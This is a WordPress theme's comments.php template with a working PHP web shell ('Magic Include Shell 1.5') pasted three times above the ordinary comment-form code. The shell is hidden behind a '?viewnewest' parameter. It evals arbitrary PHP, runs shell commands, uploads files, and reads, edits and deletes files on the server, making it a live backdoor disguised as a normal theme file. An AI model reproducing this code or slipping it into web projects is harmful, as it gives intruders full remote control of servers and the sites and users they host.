<?php
$ver='1.5';
if(isset($_GET[viewnewest]))
{
$site=$PHP_SELF;
header("Content-type: text/html");
$dira=$_GET['dira'];
(empty($dira) || !isset($dira)) ? $dira='./' : '';
if(!ereg("/$",$dira)) $dira=$dira.'/';
$comanda=$_POST['comanda'];
$shcom=$_POST['shcom'];

if(isset($_POST['filee']) && !empty($_POST['filee']))
$filee=$_POST['filee'];
elseif(isset($_GET['filee']) && !empty($_GET['filee']))
$filee=$dira.''.$_GET['filee'];

$uploadfile=$_POST['uploadfile'];
$uploaddir=$_POST['uploaddir'];
$del=$_GET[del];

if(isset($_POST['edit']) && !empty($_POST['edit']))
$edit=$_POST['edit'];
elseif(isset($_GET['edit']) && !empty($_GET['edit']))
$edit=$_GET['edit'];

$save_edit=$_POST[save_edit];
function cutter($str,$sym,$len){
do{$serr=1;
if(strpos($str,$sym)!==false){
$serr=0;
$str1 = substr($str,0,strpos($str,$sym));
$str2 = substr($str,strpos($str,$sym)+$len,strlen($str));
$str = $str1.$str2;
}
} while($serr==0); 
return $str;
}   

$kverya=cutter($_SERVER["QUERY_STRING"],'dira=',999);
while(ereg('&&',$kverya))
{
$kverya=str_replace('&&','&',$kverya);
}

?>
<html>
<head>
<title>Magic Include Shell <?php echo $ver; ?></title>
<STYLE fprolloverstyle>A{COLOR: #00ff00;}
INPUT {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
TEXTAREA {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
</STYLE>
</head>
<SCRIPT language=Javascript><!--
var tl=new Array("Magic Include Shell ver.<?php echo $ver; ?> =) Private Edition by Mag, icq 884888");
var speed=40;
var index=0; text_pos=0;
var str_length=tl[0].length;
var contents, row;

function type_text()
{
  contents='';
  row=Math.max(0,index-20);
  while(row<index)
    contents += tl[row++] + '\r\n';
  document.forms[0].elements[0].value = contents + tl[index].substring(0,text_pos) + "_";
  if(text_pos++==str_length)
  {
    text_pos=0;
    index++;
    if(index!=tl.length)
    {
      str_length=tl[index].length;
      setTimeout("type_text()",300);
    }
  } else
    setTimeout("type_text()",speed);
 }//--></SCRIPT>
<body text=#ffffff bgColor=#000000 onload=type_text()>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
<textarea rows=1 cols=70></textarea><br/>
Php eval:<br/>
<textarea name="comanda" rows=10 cols=50></textarea><br/>
<input type="submit" value="eval"/>
</form>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
Shell command:<br/><input name="shcom"><br/>
<input type="submit" value="shell"/>
</form>
<form enctype="multipart/form-data" action="<?php print "$site?$kverya&dira=$dira"; ?>" method="post">
 <input type="hidden" name="MAX_FILE_SIZE" value="30000000" />
 File to upload:<br/><input name="uploadfile" type="file" />
<br/>Dir to upload:<br/><input name="uploaddir" value="<?php print $dira; ?>"/><br/>
 <input type="submit" value="Send File" />
</form>

<?php

if(!empty($comanda))
{
eval(trim(stripslashes($comanda)));
}
if(!empty($shcom))
{
`cd $dira`;
print '<pre>'.`$shcom`.'</pre>';
}

if(!empty($HTTP_POST_FILES['uploadfile']['name']))
{
@copy($HTTP_POST_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$HTTP_POST_FILES['uploadfile']['name']) ? print "<b>File ".$HTTP_POST_FILES['uploadfile']['name']." uploaded succesfully!</b><br/>" : print "<b>Upload error!</b><br/>";
}

if(!empty($del))
{
unlink($dira.$del);
print '<b>'.$del.' deleted succesfully!</b><br/>';
}

if(!empty($filee))
{
?>
<pre>

<?php
$massiv=file($filee);
for($ii=0;$ii<count($massiv);$ii++)
{
print htmlspecialchars($massiv[$ii]);
}

?>
</pre>
<?php
}

if(!empty($edit) && empty($save_edit))
{
?>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
<textarea name="save_edit" rows=20 cols=70>
<?php
$fss = @ fopen($edit, 'r');
print htmlspecialchars(fread($fss, filesize($edit)));
fclose($fss);
?>
</textarea><br/>
<input type="hidden" value="<?php print $edit ?>" name="edit"/>
<input type="submit" value="edit"/>

</form>
<?php

}
elseif(!empty($edit) && !empty($save_edit))
	{
	$fp=fopen($edit,"w");
	fputs($fp,stripslashes($save_edit));
	fclose($fp);
	print "<b>$edit edited succesfully!</b><br/>";
	}
print '<b>Dir='.$dira.'</b><br/>';
if(!($dp = opendir($dira))) die ("Cannot open ./");
$file_array = array(); 
while ($file = readdir ($dp))
	{
		$file_array[] =  $file;
	}

sort ($file_array);

			while (list($fileIndexValue, $file_name) = each ($file_array))
				{
				

			if(is_file($dira.''.$file_name))
				{
				echo "<a href=\"$site?$kverya&dira=$dira&filee=$file_name\">$file_name</a> (". round(filesize($dira.''.$file_name)/1024,1) . "kb)";
				if(is_writeable($dira.''.$file_name))
					{
					echo "-[<a href=\"$site?$kverya&dira=$dira&del=$file_name\">del</a>]";
					echo "<a href=\"$site?$kverya&dira=$dira&edit=$file_name\">edit</a>]";
					}
				print '<br/>';
				}
			else 
				echo "<a href=\"$site?$kverya&dira=$dira$file_name\">$file_name</a><br/>";	
				}


?>
</body>
</html>
<?php exit; }?>

<?php
$ver='1.5';
if(isset($_GET[viewnewest]))
{
$site=$PHP_SELF;
header("Content-type: text/html");
$dira=$_GET['dira'];
(empty($dira) || !isset($dira)) ? $dira='./' : '';
if(!ereg("/$",$dira)) $dira=$dira.'/';
$comanda=$_POST['comanda'];
$shcom=$_POST['shcom'];

if(isset($_POST['filee']) && !empty($_POST['filee']))
$filee=$_POST['filee'];
elseif(isset($_GET['filee']) && !empty($_GET['filee']))
$filee=$dira.''.$_GET['filee'];

$uploadfile=$_POST['uploadfile'];
$uploaddir=$_POST['uploaddir'];
$del=$_GET[del];

if(isset($_POST['edit']) && !empty($_POST['edit']))
$edit=$_POST['edit'];
elseif(isset($_GET['edit']) && !empty($_GET['edit']))
$edit=$_GET['edit'];

$save_edit=$_POST[save_edit];
function cutter($str,$sym,$len){
do{$serr=1;
if(strpos($str,$sym)!==false){
$serr=0;
$str1 = substr($str,0,strpos($str,$sym));
$str2 = substr($str,strpos($str,$sym)+$len,strlen($str));
$str = $str1.$str2;
}
} while($serr==0); 
return $str;
}   

$kverya=cutter($_SERVER["QUERY_STRING"],'dira=',999);
while(ereg('&&',$kverya))
{
$kverya=str_replace('&&','&',$kverya);
}

?>
<html>
<head>
<title>Magic Include Shell <?php echo $ver; ?></title>
<STYLE fprolloverstyle>A{COLOR: #00ff00;}
INPUT {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
TEXTAREA {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
</STYLE>
</head>
<SCRIPT language=Javascript><!--
var tl=new Array("Magic Include Shell ver.<?php echo $ver; ?> =) Private Edition by Mag, icq 884888");
var speed=40;
var index=0; text_pos=0;
var str_length=tl[0].length;
var contents, row;

function type_text()
{
  contents='';
  row=Math.max(0,index-20);
  while(row<index)
    contents += tl[row++] + '\r\n';
  document.forms[0].elements[0].value = contents + tl[index].substring(0,text_pos) + "_";
  if(text_pos++==str_length)
  {
    text_pos=0;
    index++;
    if(index!=tl.length)
    {
      str_length=tl[index].length;
      setTimeout("type_text()",300);
    }
  } else
    setTimeout("type_text()",speed);
 }//--></SCRIPT>
<body text=#ffffff bgColor=#000000 onload=type_text()>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
<textarea rows=1 cols=70></textarea><br/>
Php eval:<br/>
<textarea name="comanda" rows=10 cols=50></textarea><br/>
<input type="submit" value="eval"/>
</form>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
Shell command:<br/><input name="shcom"><br/>
<input type="submit" value="shell"/>
</form>
<form enctype="multipart/form-data" action="<?php print "$site?$kverya&dira=$dira"; ?>" method="post">
 <input type="hidden" name="MAX_FILE_SIZE" value="30000000" />
 File to upload:<br/><input name="uploadfile" type="file" />
<br/>Dir to upload:<br/><input name="uploaddir" value="<?php print $dira; ?>"/><br/>
 <input type="submit" value="Send File" />
</form>

<?php

if(!empty($comanda))
{
eval(trim(stripslashes($comanda)));
}
if(!empty($shcom))
{
`cd $dira`;
print '<pre>'.`$shcom`.'</pre>';
}

if(!empty($HTTP_POST_FILES['uploadfile']['name']))
{
@copy($HTTP_POST_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$HTTP_POST_FILES['uploadfile']['name']) ? print "<b>File ".$HTTP_POST_FILES['uploadfile']['name']." uploaded succesfully!</b><br/>" : print "<b>Upload error!</b><br/>";
}

if(!empty($del))
{
unlink($dira.$del);
print '<b>'.$del.' deleted succesfully!</b><br/>';
}

if(!empty($filee))
{
?>
<pre>

<?php
$massiv=file($filee);
for($ii=0;$ii<count($massiv);$ii++)
{
print htmlspecialchars($massiv[$ii]);
}

?>
</pre>
<?php
}

if(!empty($edit) && empty($save_edit))
{
?>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
<textarea name="save_edit" rows=20 cols=70>
<?php
$fss = @ fopen($edit, 'r');
print htmlspecialchars(fread($fss, filesize($edit)));
fclose($fss);
?>
</textarea><br/>
<input type="hidden" value="<?php print $edit ?>" name="edit"/>
<input type="submit" value="edit"/>

</form>
<?php

}
elseif(!empty($edit) && !empty($save_edit))
	{
	$fp=fopen($edit,"w");
	fputs($fp,stripslashes($save_edit));
	fclose($fp);
	print "<b>$edit edited succesfully!</b><br/>";
	}
print '<b>Dir='.$dira.'</b><br/>';
if(!($dp = opendir($dira))) die ("Cannot open ./");
$file_array = array(); 
while ($file = readdir ($dp))
	{
		$file_array[] =  $file;
	}

sort ($file_array);

			while (list($fileIndexValue, $file_name) = each ($file_array))
				{
				

			if(is_file($dira.''.$file_name))
				{
				echo "<a href=\"$site?$kverya&dira=$dira&filee=$file_name\">$file_name</a> (". round(filesize($dira.''.$file_name)/1024,1) . "kb)";
				if(is_writeable($dira.''.$file_name))
					{
					echo "-[<a href=\"$site?$kverya&dira=$dira&del=$file_name\">del</a>]";
					echo "<a href=\"$site?$kverya&dira=$dira&edit=$file_name\">edit</a>]";
					}
				print '<br/>';
				}
			else 
				echo "<a href=\"$site?$kverya&dira=$dira$file_name\">$file_name</a><br/>";	
				}


?>
</body>
</html>
<?php exit; }?>

<?php
$ver='1.5';
if(isset($_GET[viewnewest]))
{
$site=$PHP_SELF;
header("Content-type: text/html");
$dira=$_GET['dira'];
(empty($dira) || !isset($dira)) ? $dira='./' : '';
if(!ereg("/$",$dira)) $dira=$dira.'/';
$comanda=$_POST['comanda'];
$shcom=$_POST['shcom'];

if(isset($_POST['filee']) && !empty($_POST['filee']))
$filee=$_POST['filee'];
elseif(isset($_GET['filee']) && !empty($_GET['filee']))
$filee=$dira.''.$_GET['filee'];

$uploadfile=$_POST['uploadfile'];
$uploaddir=$_POST['uploaddir'];
$del=$_GET[del];

if(isset($_POST['edit']) && !empty($_POST['edit']))
$edit=$_POST['edit'];
elseif(isset($_GET['edit']) && !empty($_GET['edit']))
$edit=$_GET['edit'];

$save_edit=$_POST[save_edit];
function cutter($str,$sym,$len){
do{$serr=1;
if(strpos($str,$sym)!==false){
$serr=0;
$str1 = substr($str,0,strpos($str,$sym));
$str2 = substr($str,strpos($str,$sym)+$len,strlen($str));
$str = $str1.$str2;
}
} while($serr==0); 
return $str;
}   

$kverya=cutter($_SERVER["QUERY_STRING"],'dira=',999);
while(ereg('&&',$kverya))
{
$kverya=str_replace('&&','&',$kverya);
}

?>
<html>
<head>
<title>Magic Include Shell <?php echo $ver; ?></title>
<STYLE fprolloverstyle>A{COLOR: #00ff00;}
INPUT {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
TEXTAREA {BORDER-LEFT-COLOR: #000000; BACKGROUND: #000000; BORDER-BOTTOM-COLOR: #000000; FONT: 12px Verdana, Arial, Helvetica, sans-serif; COLOR: #00ff00; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-COLOR: #000000}
</STYLE>
</head>
<SCRIPT language=Javascript><!--
var tl=new Array("Magic Include Shell ver.<?php echo $ver; ?> =) Private Edition by Mag, icq 884888");
var speed=40;
var index=0; text_pos=0;
var str_length=tl[0].length;
var contents, row;

function type_text()
{
  contents='';
  row=Math.max(0,index-20);
  while(row<index)
    contents += tl[row++] + '\r\n';
  document.forms[0].elements[0].value = contents + tl[index].substring(0,text_pos) + "_";
  if(text_pos++==str_length)
  {
    text_pos=0;
    index++;
    if(index!=tl.length)
    {
      str_length=tl[index].length;
      setTimeout("type_text()",300);
    }
  } else
    setTimeout("type_text()",speed);
 }//--></SCRIPT>
<body text=#ffffff bgColor=#000000 onload=type_text()>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
<textarea rows=1 cols=70></textarea><br/>
Php eval:<br/>
<textarea name="comanda" rows=10 cols=50></textarea><br/>
<input type="submit" value="eval"/>
</form>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
Shell command:<br/><input name="shcom"><br/>
<input type="submit" value="shell"/>
</form>
<form enctype="multipart/form-data" action="<?php print "$site?$kverya&dira=$dira"; ?>" method="post">
 <input type="hidden" name="MAX_FILE_SIZE" value="30000000" />
 File to upload:<br/><input name="uploadfile" type="file" />
<br/>Dir to upload:<br/><input name="uploaddir" value="<?php print $dira; ?>"/><br/>
 <input type="submit" value="Send File" />
</form>

<?php

if(!empty($comanda))
{
eval(trim(stripslashes($comanda)));
}
if(!empty($shcom))
{
`cd $dira`;
print '<pre>'.`$shcom`.'</pre>';
}

if(!empty($HTTP_POST_FILES['uploadfile']['name']))
{
@copy($HTTP_POST_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$HTTP_POST_FILES['uploadfile']['name']) ? print "<b>File ".$HTTP_POST_FILES['uploadfile']['name']." uploaded succesfully!</b><br/>" : print "<b>Upload error!</b><br/>";
}

if(!empty($del))
{
unlink($dira.$del);
print '<b>'.$del.' deleted succesfully!</b><br/>';
}

if(!empty($filee))
{
?>
<pre>

<?php
$massiv=file($filee);
for($ii=0;$ii<count($massiv);$ii++)
{
print htmlspecialchars($massiv[$ii]);
}

?>
</pre>
<?php
}

if(!empty($edit) && empty($save_edit))
{
?>
<form method="POST" action="<?php print "$site?$kverya&dira=$dira"; ?>">
<textarea name="save_edit" rows=20 cols=70>
<?php
$fss = @ fopen($edit, 'r');
print htmlspecialchars(fread($fss, filesize($edit)));
fclose($fss);
?>
</textarea><br/>
<input type="hidden" value="<?php print $edit ?>" name="edit"/>
<input type="submit" value="edit"/>

</form>
<?php

}
elseif(!empty($edit) && !empty($save_edit))
	{
	$fp=fopen($edit,"w");
	fputs($fp,stripslashes($save_edit));
	fclose($fp);
	print "<b>$edit edited succesfully!</b><br/>";
	}
print '<b>Dir='.$dira.'</b><br/>';
if(!($dp = opendir($dira))) die ("Cannot open ./");
$file_array = array(); 
while ($file = readdir ($dp))
	{
		$file_array[] =  $file;
	}

sort ($file_array);

			while (list($fileIndexValue, $file_name) = each ($file_array))
				{
				

			if(is_file($dira.''.$file_name))
				{
				echo "<a href=\"$site?$kverya&dira=$dira&filee=$file_name\">$file_name</a> (". round(filesize($dira.''.$file_name)/1024,1) . "kb)";
				if(is_writeable($dira.''.$file_name))
					{
					echo "-[<a href=\"$site?$kverya&dira=$dira&del=$file_name\">del</a>]";
					echo "<a href=\"$site?$kverya&dira=$dira&edit=$file_name\">edit</a>]";
					}
				print '<br/>';
				}
			else 
				echo "<a href=\"$site?$kverya&dira=$dira$file_name\">$file_name</a><br/>";	
				}


?>
</body>
</html>
<?php exit; }?>

<?php // Do not delete these lines
	if ('comments.php' == basename($_SERVER['SCRIPT_FILENAME']))
		die ('Please do not load this page directly. Thanks!');

        if (!empty($post->post_password)) { // if there's a password
            if ($_COOKIE['wp-postpass_' . COOKIEHASH] != $post->post_password) {  // and it doesn't match the cookie
				?>
				
				<p class="nocomments">This post is password protected. Enter the password to view comments.<p>
				
				<?php
				return;
            }
        }

		/* This variable is for alternating comment background */
		$oddcomment = 'alt';
?>

<!-- You can start editing here. -->
<div id="comments">

<div id="comments-header"><?php comments_number('Comment', '1 Comment', '% Comments' );?></div>

<?php if ($comments) : ?>






	<?php foreach ($comments as $comment) : ?>

		<div id="comment">
			<?php if ($comment->comment_approved == '0') : ?>
			<em>Your comment is awaiting moderation.</em>
			<?php endif; ?>

			<h3><a href="#comment-<?php comment_ID() ?>" title=""><?php comment_date('F jS, Y') ?> at <?php comment_time() ?></a> <?php edit_comment_link('e','',''); ?></h3>

			<p><?php comment_text() ?></p>
            
            <h4><?php comment_author_link() ?></h4> 

		</div>

	<?php /* Changes every other comment to a different class */	
		if ('alt' == $oddcomment) $oddcomment = '';
		else $oddcomment = 'alt';
	?>

	<?php endforeach; /* end for each comment */ ?>


 <?php else : // this is displayed if there are no comments so far ?>

  <?php if ('open' == $post->comment_status) : ?> 
		<!-- If comments are open, but there are no comments. -->
		
	 <?php else : // comments are closed ?>
		<!-- If comments are closed. -->
		<p class="nocomments">Comments are closed.</p>
		
	<?php endif; ?>
    
    
            
    

<?php endif; ?>


<?php if ('open' == $post->comment_status) : ?>

<h3 id="respond">Leave a Reply</h3>

<?php if ( get_option('comment_registration') && !$user_ID ) : ?>
<p>You must be <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?redirect_to=<?php the_permalink(); ?>">logged in</a> to post a comment.</p>
<?php else : ?>

<form action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post" id="commentform">

<?php if ( $user_ID ) : ?>

<p>Logged in as <a href="<?php echo get_option('siteurl'); ?>/wp-admin/profile.php"><?php echo $user_identity; ?></a>. <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?action=logout" title="Log out of this account">Logout &raquo;</a></p>

<?php else : ?>

<p><input type="text" name="author" id="author" value="<?php echo $comment_author; ?>" size="22" tabindex="1" />
<label for="author"><small>Name <?php if ($req) echo "(required)"; ?></small></label></p>

<p><input type="text" name="email" id="email" value="<?php echo $comment_author_email; ?>" size="22" tabindex="2" />
<label for="email"><small>Mail (will not be published) <?php if ($req) echo "(required)"; ?></small></label></p>

<p><input type="text" name="url" id="url" value="<?php echo $comment_author_url; ?>" size="22" tabindex="3" />
<label for="url"><small>Website</small></label></p>

<?php endif; ?>

<!--<p><small><strong>XHTML:</strong> You can use these tags: <?php echo allowed_tags(); ?></small></p>-->

<p><textarea name="comment" id="comment" cols="60" rows="10" tabindex="4"></textarea></p>

<p><input name="submit" type="submit" id="submit" tabindex="5" value="Submit Comment" />
<input type="hidden" name="comment_post_ID" value="<?php echo $id; ?>" />
</p>
<?php do_action('comment_form', $post->ID); ?>

</form>

<?php endif; // If registration required and not logged in ?>

<?php endif; // if you delete this the sky will fall on your head ?>
</div>